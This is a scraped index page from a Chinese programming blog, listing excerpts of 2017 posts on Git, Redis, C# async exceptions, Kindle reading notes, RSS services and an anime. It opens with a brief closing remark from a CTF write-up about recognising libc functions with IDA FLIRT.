<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>這題解到一半時，隊友 <strong>Isaac</strong> 提醒說 IDA 有個東西叫 <a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/tech/flirt/index.shtml">FLIRT</a>，可以透過一些 <a target="_blank" rel="noopener" href="https://github.com/push0ebp/sig-database">signature database</a> 來辨別 libc 的 function，讓我們在做 reversing 時可以輕鬆一點。直到那時我才知道，程式裡面的隨機化函式其實就只是 libc 裡面的 <code>srand()</code> 和 <code>random()</code>……所以其實可以直接用暴力法把我們要跳的 return address 給爆出來……不過當時用 file stream pointer overflow 解到一半了，就沒有用這種方式解，要不然應該會快上許多。就當作是長經驗吧 Q_Q</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/hackers-and-painters-reading-note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/hackers-and-painters-reading-note/" itemprop="url">《黑客与画家》读书笔记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-29T10:37:26+00:00">
                2017-04-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>利用零散时间读完了《黑客与画家：硅谷创业之父 Paul Graham 文集》这本书，收获颇多。不过说是读书笔记，其实只是把一些觉得好的段落记录一下而已。这里不得不吐槽一下 Kindle 自带的标注功能：</p>
<ul>
<li>所有标注内容都以纯文本形式存储在一个 <code>My Clippings.txt</code> 文件里；</li>
<li>记录格式很神秘，得用特殊工具处理（<a target="_blank" rel="noopener" href="http://www.clippings.io/">Clippings</a>），比较蛋痛；</li>
<li>只是个本地功能，不会自动同步到云端；</li>
<li>无法在 Kindle 上舒爽地查看所有剪贴内容；</li>
<li>就算你在书中把原标注删除了也还会留一份在 <code>My Clippings.txt</code> 文件里；</li>
<li>最近 Kindle 固件升级，段落标注体验更屎了……</li>
</ul>
<p>不过阅读体验还是很不错的，所以原谅你。</p>
<p><img src="https://img.prin.studio/images/2017/04/29/20170429183338.png" alt="Amazon"></p>
<p><em>▲中亚上 Kindle 书籍大多数都很便宜</em></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/hackers-and-painters-reading-note/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/long-live-rss/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/long-live-rss/" itemprop="url">Long Live RSS：有感于微广场之死</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-29T07:49:50+00:00">
                2017-04-29
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>今天打开 InoReader，一眼便看到「微广场」关闭服务的通知。虽然我知道这类提供微信公众号 RSS 输出的服务总有一天是会消亡的，但没想到竟是如此之快。极尽惋惜之余，不由得一声叹息。</p>
<p><img src="https://img.prin.studio/images/2017/04/29/iwgc_closed.png" alt="微广场关站通知"></p>
<p>我个人是不愿意去耗费精力折腾微信公众号的抓取的，毕竟能用钱解决的事，为什么要浪费时间呢？因此我也非常愿意为这类服务付费。既然微广场已经倒下，那我也不得不寻找其他对应方案了，目前看起来<a target="_blank" rel="noopener" href="http://www.jintiankansha.me/">「今天看啥」</a>这个服务还不错。</p>
<hr>
<p>这是一个信息爆炸的时代。</p>
<p>而我们却被大量的垃圾信息绑架着。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/long-live-rss/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/kemono-friends/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/kemono-friends/" itemprop="url">快乐的旅途与汇聚的奇迹：《动物朋友》推荐</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-23T06:02:50+00:00">
                2017-04-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>本文大概有 14k 字，我也不知道阅读完需要多少分钟。</p>
</blockquote>
<p>不过为了方便各位看官的时间管理，我还是贴心地提供了 TL;DR（太长不看）简介：</p>
<blockquote>
<p>《动物朋友》超好看的！！！</p>
</blockquote>
<p>标题上的「推荐」二字只是为了念起来好听，实际上本文并无多少安利意图。</p>
<p>谨以此文纪念《动物朋友》这部奇迹的作品。</p>
<h2 id="一、什么是《动物朋友》？"><a href="#一、什么是《动物朋友》？" class="headerlink" title="一、什么是《动物朋友》？"></a>一、什么是《动物朋友》？</h2><p>『动物朋友』（けものフレンズ，又译作『兽娘动物园』、『萌兽之友』）是由けものフレンズプロジェクト发起的日本跨媒体制作企划，有手游、漫画、动画等衍生作品。本文主要讲述企划中于 2017 年 1 月开播的 TV 动画。</p>
<blockquote>
<p>个人比较喜欢「动物朋友」这个译名，看不惯的朋友们请自行脑内替换。以我奇妙的感性来看，「动物朋友」更能体现出「人」与「动物」之间的亲密关系，而不是像「兽娘动物园」那样有种淡淡的疏离感。毕竟这部作品讲述的是人类与各种动物们和睦相处、互相扶持渡过难关的温馨故事，而不是人类通过牢笼般的「动物园」观察动物们。</p>
</blockquote>
<p>这部动画讲述的是在疑似人类灭绝、看不到其他人类存在的巨大综合<del>美少女</del>动物园「Japari Park（ジャパリパーク）」里，动画里目前唯一的人类「小包（かばんちゃん）」在旅途中与各式各样因「砂之星（サンドスター）」的力量而拥有人类姿态的动物女孩 —— 通称「Friends（フレンズ）」们邂逅的故事。</p>
<p><img src="https://img.prin.studio/images/2017/04/04/anime-main.jpg" alt="动画主视觉图"></p>
<p>……当然，如果仅仅是这样，我是不可能为它专门写一篇博客的，毕竟我这博客又不是什么 ACG 资讯站点 (・_ゝ・)</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/kemono-friends/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/04/git-command/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/04/git-command/" itemprop="url">Git使用技巧</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-18T15:02:22+00:00">
                2017-04-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
                    <span itemprop="name">工具</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>原文：阮一峰老师的 <a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html">常用 Git 命令清单</a></p>
</blockquote>
<p>我每天使用 Git ，但是很多命令记不住。一般来说，日常使用只要记住下图 6 个命令，就可以了。但是熟练使用，恐怕要记住 60～100 个命令。</p>
<p><img src="//www.fanhaobai.com/2017/04/git-command/bg2015120901.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/04/git-command/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E5%A6%82%E4%BD%95%E5%9C%A8Windows%E4%B8%8B%E5%83%8FMac%E4%B8%80%E6%A0%B7%E4%BC%98%E9%9B%85%E5%BC%80%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E5%A6%82%E4%BD%95%E5%9C%A8Windows%E4%B8%8B%E5%83%8FMac%E4%B8%80%E6%A0%B7%E4%BC%98%E9%9B%85%E5%BC%80%E5%8F%91/" itemprop="url">如何在Windows下像Mac一样优雅开发</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-17T16:03:08+00:00">
                2017-04-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>起因：之前一直用Mac开发，换了家公司，只许用Windows下开发，说实话，一开始我是拒绝的，可自从看到了这几个工具以后……</p>
</blockquote>
<blockquote>
<p>下文大标题说明：（Mac下的工具）VS（Windows下的工具），Mac下的工具说明会简要点，毕竟看文章的基本上都是实在受不了Windows的重度Mac开发者。</p>
</blockquote>
<h2 id="1-item2-VS-Cmder"><a href="#1-item2-VS-Cmder" class="headerlink" title="1. item2 VS Cmder"></a>1. item2 VS Cmder</h2><blockquote>
<p>终端工具</p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/%E5%A6%82%E4%BD%95%E5%9C%A8Windows%E4%B8%8B%E5%83%8FMac%E4%B8%80%E6%A0%B7%E4%BC%98%E9%9B%85%E5%BC%80%E5%8F%91/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E5%BC%82%E6%AD%A5Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%A2%E7%B4%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E5%BC%82%E6%AD%A5Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%A2%E7%B4%A2/" itemprop="url">异步 Lambda 表达式问题的探索</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-15T13:10:47+00:00">
                2017-04-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">编程语言</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          async void 方法引发异常时，因为它没有 Task 对象来放置异常，因此它的异常 SynchronizationContext 上引发，而且因为[AsyncVoidMethodBuilder](http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.asyncvoidmethodbuilder.aspx)内部并没有使用 TaskScheduler，因此对于 async void 方法来说，线程池中未捕获的异常将会一直向上抛并最终导致程序异常终止，虽然我们可以在 AppDomain.UnhandledException 这个事件中捕捉到这些"未处理的异常"，但这并不能阻止程序异常终止，通过我们可以通过注册这个事件来记录异常日志，以帮助我们快速定位问题;好了，现在我们回到这篇文章开始的问题，我们现在知道 async Task 和 async Task<T>引发的异常，都不会是程序立即终止，除非我们显式地去 await 一个 Task 对象会引发异常，可是对 async void 来讲，一旦它引发异常，常规的 try-catch 时无法捕捉到异常的，这种"未处理的异常"会一直向上抛并最终导致程序异常终止;我们注意到这里声明了两个 Action，即两个没有返回值的委托类型，它们的不同点在于前者使用了 async/await 这两个关键字，而后者则是一个普通的同步方法，那么这两者生成的 IL 代码是否有区别呢
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/%E5%BC%82%E6%AD%A5Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%A2%E7%B4%A2/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/" itemprop="url">Redis 缓存技术学习系列之发布订阅</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-15T13:03:57+00:00">
                2017-04-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" itemprop="url" rel="index">
                    <span itemprop="name">数据存储</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          对具体观察者而言，我们需要做的就是继承 Observer 类然后重写 Update 方法，在这里我们需要实现两个不同的类 EmailObserver 和 WechatObserver，它们分别来实现邮件和公众号接收到主题推送消息以后的逻辑，这里以 EmailObserver 为例，代码实现如下：;在这里，我们订阅的公众号称为"主题"，而我们则称为"观察者"或者"订阅者"，而这正是观察者模式又被称为"发布-订阅模式"的原因所在，这种定义了一种一对多的依赖关系，让多个观察者同时监听同一个主题对象，当该主题对象在状态发生变化时，会通知所有观察者对象并使其自动更新自己的设计模式就被称为"观察者模式";这个场景可以看出"推送模式"让订阅者饱受消息骚扰，而为了解决这个问题，我们就有了"拉取模式"，此时主题仅仅是告诉观察者博客内容有更新，而更新的内容需要观察者自己去处理，这种模式大同小异，大家可以参照"推送模式"来自己实现
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86/" itemprop="url">Redis 缓存技术学习系列之事务处理</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-08T13:46:40+00:00">
                2017-04-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" itemprop="url" rel="index">
                    <span itemprop="name">数据存储</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          在这个例子中，我们尝试在事务中对 Record_Count 做一个自增操作，这段代码在非并发的情况下是没有问题的，可是在并发的情况下，如果在执行 EXEC 命令前有一个用户修改了 Record_Count 的值，那么我们此时的结果就会比期望的结果小 1，现在我们有了 WATCH，Redis 就会对 Record_Count 进行监听，当 Redis 监听到该值发生变化的时候，这个事务就会被自动取消，进而避免造成冲突;Redis 中提供了一种称为 check-and-set 的机制，该机制主要通过 WATCH 命令来实现，其原理正是基于乐观锁的策略，Redis 会在执行 EXEC 命令前检查被监视的键对应的值是否发生变化，如果该值发生变化表明有人修改过这个键中存储的值，此时 Redis 将会自动取消当前事务;特别地，因为在 Redis 中命令是存储在一个队列中，所以，事务中的所有命令都会按顺序执行，并且在执行事务的过程中不会被客户端发送的其它命令中断
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/Redis%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/04/array-form-max-string/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/04/array-form-max-string/" itemprop="url">求非负数组元素组成的最大字符串</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-03T05:43:56+00:00">
                2017-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
